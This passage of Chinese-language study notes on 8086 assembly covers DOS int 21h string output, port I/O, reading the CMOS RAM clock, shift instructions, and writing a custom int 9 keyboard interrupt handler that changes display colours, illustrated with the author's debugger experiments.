class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ds:dx指向字符串 ;要显示的字符串需用“$”作为结束符</span><br><span class="line">mov ah,9      ;功能号9,表示在光标位置显示字符串</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><ul><li>(ah)&#x3D;9表示调用第21h号中断例程的 9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。</li><li>编程:在屏幕的5列12行显示字符串</li><li>“$”本身不显示，只起到边界的作用</li><li>如果字符串比较长，遇到行尾，程序会自动转到下一行开头处继续显示;如果到了最后一行，还能自动上卷一行。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802103342796.png" alt="image-20240802103342796"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802103606719.png" alt="image-20240802103606719"></p><p>我们发现int 10h的程序2的功能是设置光标的功能，这时在运行int 21h的程序9就可以达到我们想要的效果</p><h2 id="14-端口"><a href="#14-端口" class="headerlink" title="14 端口"></a>14 端口</h2><ul><li><p>CPU可以直接读写3 个地方的数据</p><p>(1)CPU 内部的寄存器</p><p>(2)内存单元</p><p>(3)端口</p></li></ul><h3 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h3><ul><li><p>对端口的读写不能用mov、push、pop等内存读写指令。</p></li><li><p>端口的读写指令只有两条:in 和 out分别用于从端口读取数据和往端口写入数据。</p></li><li><p>CPU 执行内存访问指令和端口指令时候，总线上的信息:<br>(1)访问内存<br>(2)访问端口</p></li><li><p>访问内存</p><p><code>mov ax,ds:[8]</code><br>假设执行前(ds)&#x3D;0<br>执行时，与总线相关的操作:</p><ul><li>CPU通过地址线将地址信息8发出;</li><li>CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据;</li><li>存储器将 8号单元中的数据通过数据线送入CPU 。</li></ul></li><li><p>访问端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in al,60h;从60h号端口读入一个字节</span><br></pre></td></tr></table></figure><p>执行时与总线相关的操作:</p><ul><li>CPU通过地址线将地址信息60h发出;</li><li>CPU通过控制线发出端口读命令，选中端所在的芯片，并通知它，将要从中读取数据;</li><li>端口所在的芯片将60h端口中的数据通过数据线送入CPU 8</li></ul></li><li><p>注意:在in和out 指令中，只能使用 ax或al 来存放从端口中读入的数据或要发送到端口中的数据。访问8 位端口时用al ，访问16 位端口时用ax。</p></li><li><p>对0~255内的端口进行读写:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h;从20h端口读入一个字节</span><br><span class="line">out 20h,al;往20h端口写入一个字节</span><br></pre></td></tr></table></figure><p>对256~65535的端口进行读写时，端口号放在dx中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h;将端口号3f8送入dx</span><br><span class="line">in al,dx;从3f8h端口读入一个字节</span><br><span class="line">out dx,al;往3f8h端口写入一个字节</span><br></pre></td></tr></table></figure></li></ul><h3 id="14-2-CMOS-RAM-芯片"><a href="#14-2-CMOS-RAM-芯片" class="headerlink" title="14.2 CMOS RAM 芯片"></a>14.2 CMOS RAM 芯片</h3><ul><li>PC机中有一个CMOS RAM芯片,其有如下特征:<ul><li>(1)包合一个实时钟和一个有128个存储单元的RAM存储器。(早期的计算机为64个字节)</li><li>(2)该芯片靠电池供电。因此，关机后其内部的实时钟仍可正常工作，RAM 中的信息不丢失</li><li>(3)128 个字节的 RAM 中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分分单元用于保存系统配置信息，供系统启动时BIOS程序读取。BIOS也提供了相关的程序，使我们可以在开机的时候配置CMOS RAM 中的系统信息。</li><li>(4)该芯片内部有两个端口，端口地址为70h和71h。CPU 通过这两个端口读写CMOS RAM </li><li>(5)70h为地址端口，存放要访问的CMOSRAM单元的地址;71h为数据端口，存放从选定的CMOS RAM 单元中读取的数据，或要写入到其中的数据。可见，CPU对CMOS RAM的读写分两步进行。<br>比如:读CMOS RAM的2号单元:<ul><li>1、将2送入端口70h</li><li>2、从71h读出2号单元的内容</li></ul></li></ul></li></ul><p><strong>实验</strong></p><p>向CMOS RAM芯片写入数据后读取</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802215348216.png" alt="image-20240802215348216"></p><p>我们debug调试发现</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240802215424134.png" alt="image-20240802215424134"></p><p>在我们向AL赋值后我们再读取其中的值并不是0</p><p>而且我们再次调试</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802215625490.png" alt="image-20240802215625490"></p><p>结果仍然在变</p><p><strong>时间在CMOS RAM中的表示形式：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">秒：在0号单元</span><br><span class="line">分：2</span><br><span class="line">时：4</span><br><span class="line">日：7</span><br><span class="line">月：8</span><br><span class="line">年：9</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802220000440.png" alt="image-20240802220000440"></p><p>我们发现这个和分针有关系</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802220049384.png" alt="image-20240802220049384"></p><h3 id="14-3-shl和shr指令"><a href="#14-3-shl和shr指令" class="headerlink" title="14.3 shl和shr指令"></a>14.3 shl和shr指令</h3><ul><li><p>shl和shr 是逻辑移位指令，后面的课程中我们要用到移位指令，这里进行一下讲解。</p></li><li><p>shl逻辑左移指令，功能为:</p><ul><li><p>(1)将一个寄存器或内存单元中的数据向左移位;</p></li><li><p>(2)将最后移出的一位写入CF中</p></li><li><p>(3)最低位以0来补充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1   ;将al中的数据左移一位</span><br><span class="line">执行后(al)=10010000b,cf=0</span><br></pre></td></tr></table></figure><p>如果移动位数大于1时，必须将移动位数放在cl中。</p><p><strong>试试</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221328123.png" alt="image-20240802221328123"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221242724.png" alt="image-20240802221242724"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221253887.png" alt="image-20240802221253887"></p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240802221406305.png" alt="image-20240802221406305"></p><p>我们试试第一位为1时</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221429520.png" alt="image-20240802221429520"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221458025.png" alt="image-20240802221458025"></p><p>发现NC变为CY</p><p>多次移位</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240802221854346.png" alt="image-20240802221854346"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221907392.png" alt="image-20240802221907392"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802221843494.png" alt="image-20240802221843494"></p><p>我们发现cf的值仍是以最后输入的一位为主的</p></li></ul></li><li><p>我们发现将x左移一位，相当于把它乘以2</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802222151283.png" alt="image-20240802222151283"></p><p>cf的意思就是相当于产生了进位</p></li><li><p>shr逻辑右移指令，它和shl所进行的操作刚好相反</p><ul><li>(1)将一个寄存器或内存单元中的数据向右移位;</li><li>(2)将最后移出的一位写入CF中</li><li>(3)最高位以0来补充</li></ul></li><li><p>我们发现将x右移一位，相当于把它除以2</p></li></ul><h3 id="14-4-CMOS-RAM中存储的时间信息"><a href="#14-4-CMOS-RAM中存储的时间信息" class="headerlink" title="14.4 CMOS RAM中存储的时间信息"></a>14.4 CMOS RAM中存储的时间信息</h3><ul><li><p>在CMOS RAM中，存放着当前时间:<br>秒:00H<br>分:02H<br>时:04H<br>日:07H<br>月:08H<br>年:09H</p></li><li><p>这6个信息的长度长度都为1个字节。</p></li><li><p>这些数据以BCD码的方式存放</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802224825744.png" alt="image-20240802224825744"></p></li><li><p>可见，一个字节可表示两个BCD码。则CMOS RAM存储时间信息的单元中存储了用两个 BCD码表示的两位十进制数，高 4 位的BCD码表示十位，低4位的BCD 码表示个位。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">mov al,8</span><br><span class="line">out 70h,al</span><br><span class="line">in al,71h;这一段是获取8号单元也就是月份的数据</span><br><span class="line"></span><br><span class="line">add al,48;我们获取的数据不是ascll码所以要加上48</span><br><span class="line"></span><br><span class="line">mov cx,0b800h</span><br><span class="line">mov ds,cx</span><br><span class="line">mov bx,[160*8+2*15];设置显存地址</span><br><span class="line">mov ah,0cah;设置背景</span><br><span class="line">mov ds:[bx],ax;加载入显存</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802231724996.png" alt="image-20240802231724996"></p><h2 id="15-外中断"><a href="#15-外中断" class="headerlink" title="15 外中断"></a>15 外中断</h2><ul><li><p>CPU 在计算机系统中，除了能够执行指令，进行运算以外，还应该能够对外部设备进行控制，接收它们的输入、向它们进行输出。</p></li><li><p>也就是说，CPU 除了有运能力外，还要有 I&#x2F;O(Input&#x2F;Output ，输入&#x2F;输出)能力</p></li></ul><h3 id="15-1-接口芯片和端口"><a href="#15-1-接口芯片和端口" class="headerlink" title="15.1 接口芯片和端口"></a>15.1 接口芯片和端口</h3><ul><li><p>第 14 章我们讲过，在PC 系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，CPU 将这些寄存器当作端口来访问。</p></li><li><p>外设的输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中;</p></li><li><p>CPU 向外设的输出也不是直接送入外设，而是先送入端口中，再由相关的芯片送到外设。</p></li><li><p>CPU 还可以向外设输出控制命令，而这些控制命令也是先送到相关芯片的端口中，然后再由相关的芯片根据命令对外设实施控制。</p></li><li><p>可见，<strong>CPU 通过端口和外部设备进行联系</strong></p></li><li><p>CPU 在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入。</p></li></ul><h3 id="15-2-外中断信息"><a href="#15-2-外中断信息" class="headerlink" title="15.2 外中断信息"></a>15.2 外中断信息</h3><ul><li><p>pc系统中，外中断源一共有两类</p><ol><li>可屏蔽中断</li><li>不可屏蔽中断（少）</li></ol></li><li><p>可屏蔽中断是CPU 可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF位的设置。</p><ul><li><p>当CPU 检测到可屏蔽中断信息时:</p><ul><li>如果IF&#x3D;1，则CPU 在执行完当前指令后响应中断，引发中断过程;</li><li>如果IF&#x3D;0,则不响应可屏蔽中断。</li></ul></li><li><p>可屏蔽中断所引发的中断过程 ，除在第一步的实现上有所不同外，基本上和内中断的中断过程相同。</p></li><li><p>因为可屏蔽中断信息来自于CPU外部，中断类型码是通过数据总线送入CPU的</p></li><li><p>而内中断的中断类型码是在CPU内部产生的</p></li><li><p>现在，我们可以解释中断过程中将IF置为0的原因了。将IF置0的原因就是，在进入中断处理程序后，禁止其他的可屏蔽中断。</p></li><li><p>当然，如果在中断处理程序中需要处理可屏蔽中断，可以用指会将IF 设置为1</p></li><li><p>8086cpu中设置IF的指令</p><ul><li>sti：用于设置IF&#x3D;1</li><li>cli：用于设置IF&#x3D;0</li></ul></li></ul></li><li><p>不可屏蔽中断是CPU 必须响应的外中断。当CPU 检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。</p><ul><li>对于8086CPU 不可屏蔽中断的中断类型码固定为2。所以中断过程中，不需要取中断类型码。</li><li>不可屏蔽中断的中断过程<ul><li>标志寄存器入栈，TF、IF设置为0:</li><li>CS、IP入栈;</li><li><code>(IP)=(8)，(CS)=(0AH)</code></li></ul></li></ul></li><li><p>几乎所有由外设引发的外中断，都是可屏蔽中断。当外设有需要处理的事件(比如说键盘输入)发生时，相关芯片向CPU发出可屏蔽中断信息。</p></li><li><p>不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知CPU 的中断信息。在我们的课程中，主要讨论可屏蔽中断</p></li></ul><h3 id="15-3-PC机键盘的处理过程"><a href="#15-3-PC机键盘的处理过程" class="headerlink" title="15.3 PC机键盘的处理过程"></a>15.3 PC机键盘的处理过程</h3><ul><li><p>观察键盘输入的处理过程，体会PC机处理外设输入的基本方法</p><ol><li>键盘输入</li><li>引发9号中断</li><li>执行int 9中断例程</li></ol><ul><li><p>键盘上的每一个键相当于一个开关，键盘中有一个芯片对键盘上的每一个键的开关状态进行扫描。</p></li><li><p>按下一个键时，开关接通，该芯片就产生一个扫描码，扫描码说明了按下的键在键盘上的位置。扫描码被送入主板上的相关接口芯片的寄存器中，该寄存器的端口地址为60H。</p></li><li><p>松开按下的键时，也产生一个扫描码，扫描码说明了松开的键在键盘上的位置。松开按键时产生的扫描码也被送入60H 端口中。</p></li><li><p>一般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。</p></li><li><p>扫描码长度为一个字节，通码的第7 位为0，断码的第7位为1，即:<br>断码 &#x3D; 通码+80H</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802235148560.png" alt="image-20240802235148560"></p><p>比如:g键的通码为22H，断码为a2H</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240802235245995.png" alt="image-20240802235245995"><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802235316275.png" alt="image-20240802235316275"></p></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240802235539345.png" alt="image-20240802235539345"></p><ul><li><p>BIOS 提供了int 9中断例程，用来进行基本的键盘输入处理，主要的工作如下:</p><ol><li>读出60H 端口中的扫描码</li><li>如果是字符键的扫描码，将该扫描码和它所对应的字符码(即 ASCII码)送入内存中的 BIOS 键盘缓冲区</li></ol><ul><li><p>键盘的输入到达60H 端口时，相关的芯片就会向CPU 发出中断类型码为9的可屏蔽中断信息</p></li><li><p>CPU检测到该中断信息后，如果IF&#x3D;1，则响应中断，引发中断过程，转去执行int 9中断例程。</p></li><li><p>如果是控制键(比如 Ctrl)和切换键(比如 CapsLock)的扫描码，则将其转变为状态字节(用二进制位记录控制键和切换键状态的字节),写入内存中存储状态字节的单元。</p></li></ul><ol start="3"><li>对键盘系统进行相关的控制，比如说，向相关芯片发出应答信息。</li></ol><ul><li>BIOS键盘缓冲区是系统启动后，BIOS用于存放int9中断例程所接收的键盘输入的内存区。</li><li>该内存区可以存储 15 个键盘输入，因为int 9h中断例程除了接收扫描码外，还要产生和扫描码对应的字符码，所以在BIOS键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码。</li></ul></li><li><p>0040:17 单元存储键盘状态字节，该字节记录了控制键和切换键的状态。键盘状态字节各位记录的信息如下:</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803000627264.png" alt="image-20240803000627264"></p></li></ul><h3 id="15-4-编写int-9h中断例程"><a href="#15-4-编写int-9h中断例程" class="headerlink" title="15.4 编写int 9h中断例程"></a>15.4 编写int 9h中断例程</h3><p>从上面的内容中，可以看出键盘输入的处理过程:</p><ol><li>键盘产生扫描码;</li><li>扫描码送入60h端口;</li><li>引发9号中断;</li><li>CPU执行int9中断例程处理键盘输入。</li></ol><p>我们能修改的就只有4</p><p><strong>问题</strong></p><p>编程:在屏幕中间依次显示“a”~“z”，并可以让人看清。在显示的过程中，按下Esc 键后，改变显示的颜色。</p><p>首先是依次显示a到z</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,[160*8+2*12]</span><br><span class="line">mov al,&#x27;a&#x27;</span><br><span class="line">s:  mov ds:[bx],al</span><br><span class="line">inc al</span><br><span class="line">cmp al,&#x27;z&#x27;</span><br><span class="line">jna s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803002554249.png" alt="image-20240803002554249"></p><p>可能是我电脑处理的太快，他只能看到最后的z</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cls dos中的清屏指令</span><br></pre></td></tr></table></figure><p>我们应该在每显示一个字母后，延时一段时间，让人看清后再显示下一个字母，如何延时呢？</p><p>做空循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,[160*8+2*12]</span><br><span class="line">mov al,&#x27;a&#x27;</span><br><span class="line">s:  call lti</span><br><span class="line">mov ds:[bx],al</span><br><span class="line">inc al</span><br><span class="line">cmp al,&#x27;z&#x27;</span><br><span class="line">jna s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">lti:push ax</span><br><span class="line">push dx</span><br><span class="line">mov dx,1000h</span><br><span class="line">mov ax,0</span><br><span class="line">s1: sub al,1;此时产生借位，并且al为ff，我电脑太撇火了我就循环少点</span><br><span class="line">sbb dx,0</span><br><span class="line">cmp al,0;这里要循环ff次，如果是ax就是ffff次</span><br><span class="line">jne s1</span><br><span class="line">cmp dx,0;第一次到达这里dx的值为0fff，al为0，又开始第一轮循环，直到dx=0，循环1000h*ffh次</span><br><span class="line">jne s1</span><br><span class="line">pop dx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>之后我们要做的是按下esc改变颜色</p><p>键盘输入到达60h 端口后，就会引发 9号中断CPU 则转去执行int 9中断例程。</p><p>我们可以编写int 9中断例程，功能如下:</p><p>(1)从60h 端口读出键盘的输入;</p><p>(2)调用BTOS的int9中断例程，处理其他硬件细节;</p><p>(3)判断是否为Esc的扫描码，如果是，改 变显示的颜色后返回;如果不是则直接返回</p><ul><li><p>新的中断处理程序中调用原来的int 9中断例程时，中断向量表中的int 9中断例程的入口地址却不是原来的int9中断例珵的地址。所以我们不能使用int 指令直接调用，因为你已经对中断向量表中的9号地址进行了更改</p></li><li><p>对于我们现在的问题，假设我们将原来int 9中断例程的偏移地址和段地址保存在ds:[0]和ds:[2]单元，那么我们在需要调用原来的int 9中断例程时候，就可以在 ds:[0]、ds:[2]单元中找到它的入口地址那么，有了入口地址后，我们如何进行调用呢?当然不能使用指令int 9来调用。我们可以用别的指令来对int指会进行一些模拟，从而实现对中断例程的调用。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CPU 执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下:</span><br><span class="line"></span><br><span class="line">(1)取得中断类型码N</span><br><span class="line">(2)标志寄存器入栈，TF、IF设置为0</span><br><span class="line">(3)CS、IP入栈</span><br><span class="line">(4)`(IP)=(N*4),(CS)=(N*4+2)。`</span><br><span class="line"></span><br><span class="line">从此处转去执行n号中断的中断处理程序</span><br></pre></td></tr></table></figure><p>模拟代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标志寄存器入栈，TF、IF设置为0//pushf</span><br><span class="line">CS、IP入栈</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实现IF=0，TF=0步骤</span><br><span class="line">pushf</span><br><span class="line">pop ax</span><br><span class="line">and ah,11111100b;IF和OK为标志寄存器的第9位和第8位</span><br><span class="line">push ax</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><p>全部代码太麻烦了，我就不写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 128 dup(0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0,0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,128</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">push es:[9*4]</span><br><span class="line">pop ds:[0]</span><br><span class="line">push es:[9*4+2]</span><br><span class="line">pop ds:[2]</span><br><span class="line">mov word ptr es:[9*4],offset int9</span><br><span class="line">mov es:[9*4+2],cs</span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">mov ah,&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">s:mov es:[160*12+40*2],ah</span><br><span class="line">call delay</span><br><span class="line">inc ah</span><br><span class="line">cmp ah,&#x27;z&#x27;</span><br><span class="line">jna s</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">push ds:[0];恢复向量表</span><br><span class="line">pop es:[9*4]</span><br><span class="line">push ds:[2]</span><br><span class="line">pop es:[9*4+2]</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">delay:push ax</span><br><span class="line">push dx</span><br><span class="line">mov dx,1000h</span><br><span class="line">mov ax,0</span><br><span class="line">s1:sub al,1</span><br><span class="line">sbb dx,0</span><br><span class="line">cmp al,0</span><br><span class="line">jne s1</span><br><span class="line">cmp dx,0</span><br><span class="line">jne s1</span><br><span class="line">pop dx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">int9:push ax</span><br><span class="line">push bx</span><br><span class="line">push es</span><br><span class="line">in al,60h</span><br><span class="line">pushf;保存标志寄存器</span><br><span class="line"></span><br><span class="line">pushf</span><br><span class="line">pop bx</span><br><span class="line">and bh,11111100b</span><br><span class="line">push bx</span><br><span class="line">popf;修改if和tf   </span><br><span class="line"></span><br><span class="line">call dword ptr ds:[0];跳转真的int9</span><br><span class="line"></span><br><span class="line">cmp al,1;esc的键盘扫描码为1</span><br><span class="line">jne int9ret;不相等就直接跳转，只有esc的时候才向下执行</span><br><span class="line"></span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">inc byte ptr es:[160*12+40*2+1]</span><br><span class="line">int9ret:pop es</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">iret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="15-5-安装新的int-9-中断例程"><a href="#15-5-安装新的int-9-中断例程" class="headerlink" title="15.5 安装新的int 9 中断例程"></a>15.5 安装新的int 9 中断例程</h3><p>任务：安装一个新的int 9中断例程</p><p>功能：在DOS下，按F1后改变当前屏幕的显示颜色，其他键照常处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">stack segment</span><br><span class="line">db 128 dup(0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,128</span><br><span class="line">push cs</span><br><span class="line">pop ds</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov si,offset int9</span><br><span class="line">mov di,204h</span><br><span class="line">mov cx,offset int9end-offset int9</span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br><span class="line">push es:[9*4]</span><br><span class="line">pop es:[200h]</span><br><span class="line">push es:[9*4+2]</span><br><span class="line">pop es:[202h]</span><br><span class="line">cli</span><br><span 